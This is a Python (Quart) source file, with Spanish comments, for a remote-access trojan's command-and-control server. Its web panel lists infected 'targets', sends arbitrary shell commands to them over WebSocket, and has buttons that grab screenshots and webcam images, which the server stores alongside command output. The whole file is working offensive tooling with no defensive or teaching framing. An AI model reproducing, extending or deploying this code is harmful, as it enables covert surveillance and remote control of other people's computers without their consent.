import asyncio
import base64
import os
import time
import json
from datetime import datetime
from quart import Quart, request, jsonify, websocket

app = Quart(__name__)

clients = {}
clients_lock = asyncio.Lock()

async def handle_websocket_client(client_id):
    cmd_queue = asyncio.Queue()
    
    async with clients_lock:
        clients[client_id] = {
            'ws': websocket._get_current_object(),
            'queue': cmd_queue,
            'hostname': '?',
            'terminal': [],
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
    
    print(f"[+] Cliente conectado vía WS: {client_id}")
    
    # Tarea en segundo plano para enviar comandos al cliente
    async def sender_task():
        try:
            while True:
                cmd = await cmd_queue.get()
                await websocket.send(json.dumps({'type': 'cmd', 'data': cmd}))
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"Error enviando al cliente: {e}")

    sender = asyncio.create_task(sender_task())
    
    try:
        while True:
            message = await websocket.receive()
            packet = json.loads(message)
            ptype = packet.get('type')
            data = packet.get('data')
            
            async with clients_lock:
                if client_id not in clients:
                    break
                clients[client_id]['last_seen'] = datetime.now().strftime('%H:%M:%S')
            
            if ptype == 'init':
                async with clients_lock:
                    if client_id in clients:
                        clients[client_id]['hostname'] = data
            
            elif ptype == 'screen':
                filename = f"static/screen_{client_id.replace('.', '_').replace(':', '_')}_{int(time.time())}.jpg"
                os.makedirs('static', exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(data))
                async with clients_lock:
                    if client_id in clients:
                        clients[client_id]['terminal'].append({
                            'type': 'res', 
                            'text': f"[Captura de pantalla guardada en: {filename}]"
                        })
            
            elif ptype == 'camera':
                filename = f"static/camera_{client_id.replace('.', '_').replace(':', '_')}_{int(time.time())}.jpg"
                os.makedirs('static', exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(data))
                async with clients_lock:
                    if client_id in clients:
                        clients[client_id]['terminal'].append({
                            'type': 'res', 
                            'text': f"[Captura de cámara guardada en: {filename}]"
                        })
                        
            elif ptype == 'terminal':
                async with clients_lock:
                    if client_id in clients:
                        clients[client_id]['terminal'].append({'type': 'res', 'text': data})
                        if len(clients[client_id]['terminal']) > 200:
                            clients[client_id]['terminal'] = clients[client_id]['terminal'][-200:]
                            
    except Exception as e:
        print(f"Conexión cerrada con {client_id}: {e}")
    finally:
        sender.cancel()
        await asyncio.gather(sender, return_exceptions=True)
        async with clients_lock:
            if client_id in clients:
                del clients[client_id]
        print(f"[-] Cliente desconectado: {client_id}")

@app.websocket('/ws/<client_id>')
async def ws(client_id):
    await handle_websocket_client(client_id)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 CONTROL PANEL</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Courier New', monospace;background:#0d0f12;color:#00ff66;display:flex;height:100vh}
        .sidebar{width:320px;background:#13171c;border-right:1px solid #1f2937;padding:20px;overflow-y:auto;display:flex;flex-direction:column;gap:10px}
        .sidebar h3{color:#fff;font-size:16px;letter-spacing:1px;margin-bottom:10px;border-bottom:1px solid #1f2937;padding-bottom:5px}
        .main{flex:1;display:flex;flex-direction:column;background:#090b0e}
        .terminal{background:#05070a;flex:1;padding:20px;overflow-y:auto;font-size:13px;white-space:pre-wrap;line-height:1.5;color:#e0e0e0}
        .terminal .cmd-line{color:#00bfff;font-weight:bold}
        .terminal .res-line{color:#e0e0e0;margin-bottom:10px}
        .input-bar{display:flex;padding:15px;background:#13171c;border-top:1px solid #1f2937}
        .input-bar input{flex:1;background:#05070a;color:#00ff66;border:1px solid #1f2937;padding:12px;outline:none;font-family:monospace;border-radius:4px}
        .input-bar input:disabled{background:#13171c;color:#4b5563;cursor:not-allowed}
        .client{padding:12px;margin:4px 0;background:#1c232b;cursor:pointer;border-left:4px solid #4b5563;border-radius:4px;transition:0.2s}
        .client:hover{background:#242f3a}
        .client.selected{background:#1e3a2f;border-left-color:#00ff66}
        .btn-group{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:auto;padding-top:15px;border-top:1px solid #1f2937}
        button{background:#1f2937;color:#fff;border:1px solid #374151;padding:10px;cursor:pointer;font-family:monospace;font-size:11px;font-weight:bold;border-radius:4px;transition:0.2s}
        button:hover{background:#00ff66;color:#000;border-color:#00ff66}
    </style>
</head>
<body>
<div class="sidebar">
    <h3>TARGETS</h3>
    <div id="clients-list"></div>
    <div class="btn-group">
        <button onclick="sendCmd('screenshot')">SCREENSHOT</button>
        <button onclick="sendCmd('camera')">WEBCAM</button>
        <button onclick="sendCmd('whoami')">WHOAMI</button>
        <button onclick="sendCmd('ipconfig')">IPCONFIG</button>
    </div>
</div>
<div class="main">
    <div class="terminal" id="terminal">Seleccione un cliente para interactuar...</div>
    <div class="input-bar">
        <input type="text" id="cmd-input" placeholder="Escriba un comando de sistema y presione Enter..." disabled>
    </div>
</div>
<script>
    let selected = null;
    async function refresh(){
        try {
            const resp = await fetch('/api/clients');
            const data = await resp.json();
            const container = document.getElementById('clients-list');
            
            container.innerHTML = data.map(c => `
                <div class="client ${selected === c.id ? 'selected' : ''}" onclick="select('${c.id}')">
                    <strong>${c.hostname}</strong><br>
                    <span style="font-size:11px;color:#9ca3af;">${c.ip} | Activo: ${c.last_seen}</span>
                </div>
            `).join('');
            if(selected){
                const currentClient = data.find(c => c.id === selected);
                if(currentClient){
                    const terminalDiv = document.getElementById('terminal');
                    const wasAtBottom = terminalDiv.scrollHeight - terminalDiv.scrollTop <= terminalDiv.clientHeight + 60;
                    terminalDiv.innerHTML = currentClient.terminal.map(line => {
                        if(line.type === 'cmd') {
                            return `<div class="cmd-line">> ${line.text}</div>`;
                        } else {
                            return `<div class="res-line">${line.text}</div>`;
                        }
                    }).join('');
                    if (wasAtBottom) {
                        terminalDiv.scrollTop = terminalDiv.scrollHeight;
                    }
                }
            }
        } catch(e) {
            console.error("Error en el refresco:", e);
        }
    }
    
    function select(id){
        selected = id;
        document.getElementById('cmd-input').disabled = false;
        document.getElementById('terminal').innerHTML = ""; 
        refresh();
    }
    
    async function sendCmd(cmd){
        if(!selected || !cmd.trim()) return;
        await fetch('/api/send',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({client_id: selected, command: cmd})
        });
        refresh();
    }
    
    document.getElementById('cmd-input').addEventListener('keypress', e => {
        if(e.key === 'Enter'){
            sendCmd(e.target.value);
            e.target.value = '';
        }
    });
    setInterval(refresh, 2000);
    refresh();
</script>
</body>
</html>
'''

@app.route('/')
async def index():
    return HTML_TEMPLATE

@app.route('/api/clients')
async def get_clients():
    async with clients_lock:
        return jsonify([{
            'id': cid,
            'ip': cid,
            'hostname': clients[cid]['hostname'],
            'last_seen': clients[cid]['last_seen'],
            'terminal': clients[cid]['terminal']
        } for cid in clients])

@app.route('/api/send', methods=['POST'])
async def send_command():
    data = await request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    async with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Cliente no encontrado'}), 404
        
        cmd_clean = command.strip()
        clients[client_id]['terminal'].append({'type': 'cmd', 'text': cmd_clean})
        queue = clients[client_id]['queue']
    
    try:
        await queue.put(cmd_clean)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

async def main():
    os.makedirs('static', exist_ok=True)
    port = int(os.environ.get("PORT", 5000))
    await app.run_task(host='0.0.0.0', port=port)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido por el usuario.")